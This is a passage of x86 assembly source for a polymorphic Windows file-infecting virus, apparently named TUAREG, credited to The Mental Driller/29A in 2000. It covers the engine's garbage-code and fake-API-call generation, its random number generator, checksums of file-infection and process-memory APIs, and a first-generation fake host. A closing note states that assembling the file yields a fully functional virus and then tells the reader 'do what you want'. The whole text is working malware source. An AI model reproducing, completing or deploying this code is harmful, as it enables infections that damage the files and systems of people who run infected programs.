                cmp     ecx, 0FFFFFF80h
                jae   @@AddByte
                or      ah, 80h
                stosw
                mov     eax, ecx
                stosd
                jmp   @@Continue
        @@AddByte:
                or      ah, 40h
                stosw
                mov     eax, ecx
                stosb
        @@Continue:
                mov     al, byte ptr [ebp+esi+APIInfo+0Bh]
                or      al, al
                jz    @@Check0
                cmp     al, 2
                jb    @@CheckMinus1
                ja    @@NoCheck
      @@CheckBoolean:
                call    RandomFlags
                jz    @@Check0
                mov     al, 3Dh
                stosb
                mov     eax, 1
                stosd
                jmp   @@MakeCondJump
      @@Check0: call    Random
                and     al, 3
                jz    @@Check0
                cmp     al, 2
                jb    @@OR
                jz    @@AND
       @@TEST:  mov     ax, 0C085h
                stosw
                jmp   @@MakeCondJump
       @@OR:    mov     ax, 0C009h
                stosw
                jmp   @@MakeCondJump
      @@AND:    mov     ax, 0C021h
                stosw
                jmp   @@MakeCondJump

      @@CheckMinus1:
                mov     al, 3Dh
                stosb
                mov     eax, -1
                stosd
      @@MakeCondJump:
        @@CJ_Again:
                call    RandomFlags
                jz    @@MakeJZ
                mov     al, 75h     ; JNZ
                jmp   @@MakeJump
     @@MakeJZ:  mov     al, 74h     ; JZ
   @@MakeJump:  stosb
                inc     edi      ; Leave space for the displacement
        @@CJ_Again3:
                push    dword ptr [ebp+CallsLevel1Ndx] ; Save the indexes of
                push    dword ptr [ebp+CallsLevel2Ndx] ; the calls. If we have
                push    dword ptr [ebp+CallsLevel3Ndx] ; to repeat the garbage
                                   ; because it's too long, we have to restore
                                   ; this to not set any inexistent CALL dis-
                                   ; placement over other code that's not a
                                   ; CALL
        @@CJ_Again2:
                mov     esi, edi   ; Save the actual storage index
                call    DoRandomGarbage ; Make garbage
                sub     esi, edi   ; Get the (-)displacement of the jump
                jz    @@CJ_Again2  ; If it's zero, loop to make garbage
                neg     esi        ; Calculate true displacement
                cmp     esi, 7Fh   ; Does it overpass the limit for displac.?
                jbe   @@CJ_OK      ; If not, jump and continue
                pop     dword ptr [ebp+CallsLevel3Ndx] ; Restore this, elimi-
                pop     dword ptr [ebp+CallsLevel2Ndx] ; nating any created
                pop     dword ptr [ebp+CallsLevel1Ndx] ; call before
                sub     edi, esi   ; Restore EDI...
                jmp   @@CJ_Again3  ; ...and repeat the garbage generation
               ; Here if the size of the garbage is correct
       @@CJ_OK: pop     eax ; Release the data in stack
                pop     eax
                pop     eax
                mov     eax, esi ; Put the displacement in AL
                neg     esi      ; Calculate the distance until the opcode
                mov     byte ptr [edi+esi-1], al ; Set the displacement in
                                                 ; the opcode
      @@NoCheck:
                call    APICall_RestoreStack                

        @@End:  mov     byte ptr [ebp+ImInAPI], 0
        @@End2: mov     [esp+S_EDI], edi
                popad
                ret
InsertAPICall   endp

APICall_StackOrder      db      0
APICall_StackedRegs     db      0, 0, 0

ImInAPI         db      0
AnyAPIFound     db      0
FirstAPICall    db      0

APICall_SaveEAX proc
                pushad
                xor     dl, dl
                jmp     APICall_SaveReg_Common
APICall_SaveEAX endp

APICall_SaveECX proc
                pushad
                mov     dl, 1
                jmp     APICall_SaveReg_Common
APICall_SaveECX endp

APICall_SaveEDX proc
                pushad
                mov     dl, 2
   APICall_SaveReg_Common:
                cmp     byte ptr [ebp+Index1Register], dl
                jz    @@SaveReg
                cmp     byte ptr [ebp+Index2Register], dl
                jz    @@SaveReg
                cmp     byte ptr [ebp+BufferRegister], dl
                jnz   @@NoRegister
         @@SaveReg:
                movzx   eax, byte ptr [ebp+APICall_StackOrder]
                mov     [ebp+eax+APICall_StackedRegs], dl
                inc     eax
                mov     [ebp+APICall_StackOrder], al
                call    DoPUSHReg
     @@NoRegister:
                call    DoRandomGarbage
                mov     [esp+S_EDI], edi
                popad
                ret
APICall_SaveEDX endp

PushParameter   proc
                pushad
                cmp     al, 1
                jb    @@End
                jz    @@Random
                cmp     al, 3
                jb    @@Handle
                jz    @@Buffer
                cmp     al, 5
                jb    @@BufferSize
                jz    @@Byte
                cmp     al, 7
                jb    @@Flags
                jz    @@Null
                cmp     al, 9
                jb    @@VirtualPointer
     @@VirtualSize:
                mov     al, 6Ah
                stosb
                call    Random
                and     eax, 0Fh
                add     eax, 10h
                stosb
                jmp   @@End
    @@VirtualPointer:
                mov     al, 68h
                stosb
                call    Random
                and     eax, 3FE0h
                add     eax, [ebp+EncryptedDataBeginAddress]
                stosd
                jmp   @@End
    @@Random:   call    Random
                cmp     eax, 7Fh
                jbe   @@RandomByte
                cmp     eax, 0FFFFFF80h
                jae   @@RandomByte
                push    eax
                mov     al, 68h
                stosb
                pop     eax
                stosd
                jmp   @@End
       @@RandomByte:
                push    eax
                mov     al, 6Ah
                stosb
                pop     eax
                stosb
                jmp   @@End
       @@Handle:
                mov     al, 68h
                stosb
                xor     edx, edx
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                call    Random
                and     eax, 07h
                or      eax, edx
                stosd
                jmp   @@End
     @@Buffer:  call    SelectAnAddressHigh
                mov     al, 68h
                stosb
                mov     eax, ebx
                stosd
                jmp   @@End
     @@BufferSize:
                mov     al, 6Ah
                stosb
                call    Random
                and     al, 1Fh
                or      al, 20h
                and     ah, 4
                add     al, ah
                stosb
                jmp   @@End
     @@Byte:    mov     al, 68h
                stosb
                call    Random
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@ByteByte
                stosd
                jmp   @@End
         @@ByteByte:
                mov     byte ptr [edi-1], 6Ah
                stosb
                jmp   @@End
     @@Null:    mov     ax, 006Ah
                stosw
                jmp   @@End
     @@Flags:   xor     edx, edx
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                call    Random
                and     eax, 1Fh
                bts     edx, eax
                mov     al, 68h
                stosb
                mov     eax, edx
                stosd
         @@End: mov     [esp+S_EDI], edi
                popad
                ret
PushParameter   endp

APICall_RestoreStack proc
                pushad
                movzx   eax, [ebp+APICall_StackOrder]
                or      eax, eax
                jz    @@End
     @@Loop01:  dec     eax
                js    @@End
                mov     dl, [ebp+eax+APICall_StackedRegs]
                push    eax
                call    DoPOPReg
                call    DoRandomGarbage
                pop     eax
                jmp   @@Loop01
       @@End:   mov     [esp+S_EDI], edi
                popad
                ret
APICall_RestoreStack endp

;; API information
;; Each API information has the next format:
;;
;; +00: Checksum of API name (DWORD)
;; +04: Virtual address that will have in file, 0 if not available/imported
;; +08-09-0A: Parameters in standard order (in reverse-PUSHing order):
;;            0=No parameter (last one)
;;            1=Random number
;;            2=Pseudo-handle
;;            3=Buffer address (beware with frame)
;;            4=Buffer size
;;            5=Number between 0 and 255
;;            6=Pseudo-flags
;;            7=NULL
;;            8=Any virtual address (for IsBad* funcs)
;;            9=Virtual size (for IsBad* funcs)
;; +0B: byte: Value returning check: 0=0, 1=-1, 2=Boolean, 3=Void or random
;;                                                           (no check)
;; +0C: Reserved
;;

APIInfo         label   dword  ;; There are 32 API information blocks, ordered
;; DWORD GetCommandLineaA(void) ; in frequency of use (in my opinion) in an
dd      009654E3h, 0            ; application
db      0, 0, 0, 3
dd      0
;; void GetStartupInfoA(Pointer)
dd      009DB67Fh, 0
db      3, 0, 0, 3
dd      0
;; DWORD GetEnvironmentStrings(void)
dd      14F02D92h, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetVersion(void)
dd      00217C32h, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetModuleHandleA(Pointer)
dd      0FFFFFFFFh, 0  ; dd      0005CD63h, 0
db      3, 0, 0, 0     ; Disabled. The fucking Windblows hangs the program
dd      0              ; if there is any problem with the pointer, instead of
                       ; returning an error
;; DWORD GetModuleFileNameA(Handle,Buffer,Buffer_Size)
dd      00B83717h, 0
db      2, 3, 4, 0
dd      0
;; DWORD MulDiv(Random,Random,Random)
dd      000007EAh, 0
db      1, 1, 1, 1
dd      0
;; DWORD GetACP(void)
dd      00000BEBh, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetOEMCP(void)
dd      000090CBh, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetCPInfo(CodePage,Buffer)
dd      0004C11Fh, 0
db      5, 3, 0, 0
dd      0
;; DWORD GetStdHandle(Flags)
dd      00004C91h, 0
db      6, 0, 0, 1
dd      0
;; DWORD GetLastError(void)
dd      0038408Eh, 0
db      0, 0, 0, 3
dd      0
;; void GetLocalTime(Buffer)
dd      00037E63h, 0
db      3, 0, 0, 3
dd      0
;; void GetSystemInfo(Buffer)
dd      0125711Fh, 0
db      3, 0, 0, 3
dd      0
;; DWORD GetCurrentProcess(void)
dd      46C8D729h, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetCurrentProcessID(void)
dd      8D91AE5Fh, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetCurrentThread(void)
dd      0048DF27h, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetCurrentThreadID(void)
dd      0091BE43h, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetConsoleCP(void)
dd      025AF28Bh, 0
db      0, 0, 0, 3
dd      0
;; DWORD GetCurrentDirectoryA(Buffer_Size,Buffer)
dd      2369A80Ah, 0
db      4, 3, 0, 0
dd      0
;; DWORD GetWindowsDirectoryA(Buffer,Buffer_Size)
dd      6D1CE819h, 0
db      3, 4, 0, 0
dd      0
;; DWORD GetSystemDirectoryA(Buffer,Buffer_Size)
dd      4948E80Bh, 0
db      3, 4, 0, 0
dd      0
;; DWORD GetDriveTypeA(NULL)
dd      00019307h, 0
db      7, 0, 0, 3
dd      0
;; BOOL GetComputerNameA(Buffer,Buffer_Size)
dd      012DB157h, 0
db      3, 4, 0, 2
dd      0
;; BOOL IsBadWritePtr(Buffer,Buffer_Size)
dd      0022A17Eh, 0
db      8, 9, 0, 2
dd      0
;; DWORD GetTickCount(void)
dd      00F97476h, 0
db      0, 0, 0, 3
dd      0
;; BOOL IsBadReadPtr(Buffer,Buffer_Size)
dd      000450BEh, 0
db      8, 9, 0, 2
dd      0
;; BOOL IsBadCodePtr(Buffer)
dd      0022A3EEh, 0
db      8, 0, 0, 2
dd      0
;; DWORD GetCurrentFiber(void)
dd      048DC056h, 0
db      0, 0, 0, 3
dd      0
;; DWORD LocalHandle(Address)
dd      00020491h, 0
db      8, 0, 0, 0
dd      0
;; DWORD LocalSize(Address)
dd      00101B69h, 0
db      8, 0, 0, 0
dd      0
;; DWORD LocalFlags(Handle)
dd      00040780Bh, 0
db      2, 0, 0, 1
dd      0


;; This function calls in a random order to the addresses of the functions
;; passed in EBX, ECX, EDX and ESI. It exchanges randomly its values among
;; them to get a random order, and after that pushes in the stack all this
;; addresses, so when the called functions return, the next function take
;; control, and in last terme the return of this function is complete (it's
;; the same than doing CALL EBX/CALL ECX/CALL EDX/CALL ESI/RET in the part
;; where we push the addresses, but pushing them we save bytes and we haven't
;; to save the register values).
RandomCalling   proc
                mov     eax, 5      ; Do the garbling 5 times
        @@J_00: call    RandomFlags ; Get random ZF, SF, CF and PF
                jz    @@J_01        ; Jump if ZF
                xchg    ebx, ecx    ; Exchange
        @@J_01: js    @@J_02        ; Jump if SF
                xchg    ecx, edx    ; Exchange
        @@J_02: jc    @@J_03        ; Jump if CF
                xchg    edx, esi    ; Exchange
        @@J_03: jp    @@J_04        ; Jump if JP
                xchg    esi, ebx    ; Exchange
        @@J_04: dec     eax
                jnz   @@J_00        ; Repeat 5 times
                push    ebx   ; Push all garbled addresses
                push    ecx
                push    edx
                jmp     esi   ; Jump here and conserve the return address
RandomCalling   endp

;; One of the most used functions in the engine. I think it's idea of Vecna
;; in one of his viruses. You get a random number and you save this random
;; as flags, so you have random flags to use with conditional jumps, getting
;; the same effect as CALL Random/AND AL,1/JZ xxx, but more optimized and with
;; more flags to use. Since SAHF only saves the general purpose flags, the
;; ones that can be modified with CMP (for example), we are sure that others
;; like IF or TF (important ones) are not modified.
RandomFlags     proc
                push    eax      ; Save EAX
                call    Random   ; Get a random number in AH
                sahf             ; Load it in the flags register
                pop     eax      ; Restore EAX
                ret              ; Return
RandomFlags     endp


;; The random generator. I use this routine since MeDriPolEn, and it had a 48
;; bits seed which generated near a perfect random sequence. Now it's conver-
;; ted to 32 bits, so it has a 96 bits seed (!!! - outstanding!).
Random  proc
        push    ecx                              ; Save register
        mov     eax, [ebp+DwordAleatorio1]       ; Get 1st seed
        dec     dword ptr [ebp+DwordAleatorio1]  ; Decrease to avoid linearity
        xor     eax, [ebp+DwordAleatorio2]       ; XOR with 2nd seed
        mov     ecx, eax                         ; Result in CL
        rol     dword ptr [ebp+DwordAleatorio1], cl ; ROL the 1st seed CL
                                                    ; times (random)
        add     [ebp+DwordAleatorio1], eax    ; Add (1st XOR 2nd) to 1st
        adc     eax, [ebp+DwordAleatorio2] ; Add the 2nd seed to (1st XOR 2nd)
                                           ; with CF (random CF at the moment)
        add     eax, ecx        ; EAX=(1st XOR 2nd)+2nd+CF
        ror     eax, cl         ; EAX=EAX ROL (byte)(1st XOR 2nd)
        not     eax             ; NOT (this breaks a possible proximity)
        sub     eax, 3          ; Subtract odd constant (break the linearity)
        xor     [ebp+DwordAleatorio2], eax ; Modify 2nd seed
        xor     eax, [ebp+DwordAleatorio3] ; XOR 3rd seed with the until-this-
                                           ; moment result
        rol     dword ptr [ebp+DwordAleatorio3], 1  ; Modify 3rd seed (ROL)...
        sub     dword ptr [ebp+DwordAleatorio3], ecx ; ...and with a 1st/2nd
                                                     ; seed dependant variable
        sbb     dword ptr [ebp+DwordAleatorio3], 4 ; Subtract a constant value
                                                   ; that could be 4 or 5
        inc     dword ptr [ebp+DwordAleatorio2] ; Break linearity on 2nd seed
        pop     ecx                     ; Restore register
        ret                             ; Return
Random  endp

SystemTimeReceiver label dword     ; Here we put what the API GetSystemTime
DwordAleatorio1 dd      12345678h  ; returns. Then we put DwordAleatorio3 as
DwordAleatorio2 dd      9ABCDEF0h  ; a modification of DwordAleatorio1 and 2,
DwordAleatorio3 dd      97654321h
                ;dd      87654321h  ; which are Year/Month/Day of the week/Day,
                dd      0          ; so it's day-dependant (slow polymorphism)
                dd      0       ; This variables to 0 are to make space for
                                ; the function return values

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; End of TUAREG
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀ;
;––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––;


;; These are the checksums of the API names. The checksum is calculated with:
;;   XOR EAX,EAX
;;   MOV ESI,offset String
;;Loop:
;;   MOV CL,[ESI]
;;   AND CL,3
;;   ROL EAX,CL
;;   XOR AL,[ESI]
;;   INC ESI
;;   CMP BYTE PTR [ESI],0
;;   JNZ Loop
;;
;; Which I think is quite variable and in theory it wouldn't make any problem
;; of coincidences, since it's quite variable in the result.
;; Then, the results of making this checksums (or whatever it is) to the
;; API names are as follows:
CRC_APIs                label   dword
CRC_GetProcAddress      dd      0342CDABh
CRC_CreateFileA         dd      000147CFh
CRC_CreateProcessA      dd      0A64AE17h
CRC_FindFirstFileA      dd      0070244Fh
CRC_FindNextFileA       dd      0003820Fh
CRC_GetFileAttributesA  dd      008AEB57h
CRC_SetFileAttributesA  dd      00A2EB57h
CRC_GetFullPathNameA    dd      00023117h
CRC_MoveFileA           dd      0002148Fh
CRC_CopyFileA           dd      00008C4Fh
CRC_DeleteFileA         dd      00004ACFh
CRC_WinExec             dd      00006EDBh
CRC__lopen              dd      00000DC2h
CRC_MoveFileExA         dd      000429A7h
CRC_OpenFile            dd      00000157h
CRC_ExitProcess         dd      0014572Bh

CRC_WriteProcessMemory  dd     0A8AE3121h
CRC_GetCurrentProcess   dd      46C8D729h
CRC_CreateFileMappingA  dd      0147EFAFh
CRC_MapViewOfFile       dd      00950AD7h
CRC_UnmapViewOfFile     dd      043D0AD7h
CRC_CloseHandle         dd      00011811h
CRC_SetFilePointer      dd      0014B9D6h
CRC_GetFileTime         dd      00004783h
CRC_SetFileTime         dd      00005383h
CRC_GetWindowsDirectoryA dd     6D1CE819h
CRC_GetCurrentDirectoryA dd     2369A80Ah
CRC_SetCurrentDirectoryA dd     7369A80Ah
CRC_GetSystemDirectoryA  dd     4948E80Bh
CRC_GetSystemTime       dd      00092963h
CRC_LoadLibraryA        dd      0011B62Bh
CRC_FindClose           dd      000E69F3h
CRC_WriteFile           dd      00004F07h
CRC_FreeLibrary         dd      000AE335h
                        dd      0      ; This signalizes the end of the APIs

;; This is the space that we use to store the addresses to the API functions.
FunctionsToPatch        label   dword
RVA_GetProcAddress      dd      0    ; This first 15 are used for per-process
RVA_CreateFileA         dd      0    ; residency
RVA_CreateProcessA      dd      0
RVA_FindFirstFileA      dd      0
RVA_FindNextFileA       dd      0
RVA_GetFileAttributesA  dd      0
RVA_SetFileAttributesA  dd      0
RVA_GetFullPathNameA    dd      0
RVA_MoveFileA           dd      0
RVA_CopyFileA           dd      0
RVA_DeleteFileA         dd      0
RVA_WinExec             dd      0
RVA__lopen              dd      0
RVA_MoveFileExA         dd      0
RVA_OpenFile            dd      0
RVA_ExitProcess         dd      0

RVA_WriteProcessMemory  dd      0
RVA_GetCurrentProcess   dd      0
RVA_CreateFileMappingA  dd      0
RVA_MapViewOfFile       dd      0
RVA_UnmapViewOfFile     dd      0
RVA_CloseHandle         dd      0
RVA_SetFilePointer      dd      0
RVA_GetFileTime         dd      0
RVA_SetFileTime         dd      0
RVA_GetWindowsDirectoryA dd     0
RVA_GetCurrentDirectoryA dd     0
RVA_SetCurrentDirectoryA dd     0
RVA_GetSystemDirectoryA  dd     0
RVA_GetSystemTime       dd      0
RVA_LoadLibraryA        dd      0
RVA_FindClose           dd      0
RVA_WriteFile           dd      0
RVA_FreeLibrary         dd      0

NumberOfFunctions       equ     ($ - offset FunctionsToPatch) / 4

align 4         ; Align (for memory accesses in the decryptor)

SystemTime              label   dword
  Year                  dw      0
  Month                 dw      0
  DayOfWeek             dw      0
  Day                   dw      0
  Hours                 dw      0
  Minutes               dw      0
  Seconds               dw      0
  Miliseconds           dw      0

org     SystemTime

FindFileField           label   dword
  FileAttributes        dd      0
  CreationTime          dd      0
                        dd      0
  LastAccessTime        dd      0
                        dd      0
  LastWriteTime         dd      0
                        dd      0
  FileSizeHigh          dd      0
  FileSizeLow           dd      0
  Reserved              dd      0
                        dd      0
  FileName              db      104h dup (0)
  AlternateFileName     db      10h dup (0)
FindFileFieldSize       equ     $ - offset FindFileField

FileTime        dd      0
                dd      0
                dd      0
                dd      0
                dd      0
                dd      0
                dd      0
                dd      0

                align   4    ; Align on a 4-byte boundary to give the virus
                             ; a size multiple of 4
End_Virus       label   dword
;; The virus ends here

;; This is a fake host that only says that you have been infected and then
;; you are stupid for playing with files of unknown source :P (only first
;; generation!)
FakedHost:      push    0
                push    offset Titulo
                push    offset Mensaje
                push    0
                call    MessageBoxA
                push    0
                call    ExitProcess

                db      10000h dup (90h)  ; Complete to avoid exceptions when
                                         ; zeroing on first generation

                end     TuaregMain    ; End directive

It's curious, but when you put the END directive under TASM, you can write
whatever you want after it and it won't be considered (I'm writing without
semicolons! :)

dsadjshajkdhsajkd
dsa
fds
fds
afdsa   :P

(c)The Mental Driller/29A, somewhen on November, 2000

This code is only for research and educational purposes. The assembling of
this file will produce a fully functional virus, so you have been warned! If
this kind of material is illegal in your country or state, you should remove
it from your computer. The author of this virus declines any illegal activity
including possesion and/or spreading by the possesor of the virus sourced
here. The spreading of this virus could save any life that receives the money
of anyone who got his/her web start page changed and used the
http://www.thehungersite.com donation services, but since the spreading is
illegal in the majority of the world, theorically this virus should not be
spreaded. So, do what you want :), but I'm not responsible.
